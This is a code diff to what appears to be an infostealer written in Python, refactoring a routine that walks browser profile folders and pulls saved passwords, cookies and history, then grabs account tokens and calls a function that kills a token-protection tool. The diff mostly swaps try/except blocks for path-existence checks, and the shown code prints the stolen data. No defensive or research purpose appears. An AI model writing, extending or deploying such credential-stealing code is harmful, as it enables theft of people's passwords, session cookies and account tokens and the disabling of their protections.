@@ -23,9 +23,9 @@ class Main:
         for browserKey in extractor.browsers_profile:
             browserValue = extractor.browsers_profile[browserKey]
 
-            profiles = ["Default"]
+            if os.path.exists(browserValue):
+                profiles = ["Default"]
 
-            try:
                 for folder in os.listdir(browserValue):
                     if folder.startswith("profile".lower()):
                         profiles.append(folder)
@@ -35,14 +35,12 @@ class Main:
                     history = browserExtractor.extractHistory(browserValue+f"\\{profile}\\History")
                     passwd = browserExtractor.extractPasswd(browserValue+f"\\{profile}\\Login Data")
                     cookies = browserExtractor.extractCookies(browserValue+f"\\{profile}")
-            
-            except FileNotFoundError:
-                continue
+                
 
         for browserKey in extractor.browsers:
             browserValue = extractor.browsers[browserKey]
-            
-            try:
+
+            if os.path.exists(browserValue):
                 browserExtractor = extractor.Extract(browserValue+"\\Local State")
                 history = browserExtractor.extractHistory(browserValue+"\\History")
                 passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
@@ -51,14 +49,12 @@ class Main:
                 print(history)
                 print(passwd)
                 print(cookies)
-            except FileNotFoundError:
-                continue
 
     def steam(self):
         pass
 
     def token(self):
-        tokens = tokengrabber.extract_tokens()
+        tokens = tokengrabber.extract_tokens().tokens
         print(tokens)
         extractor.Anti_tokenprotector.killprotector()
 
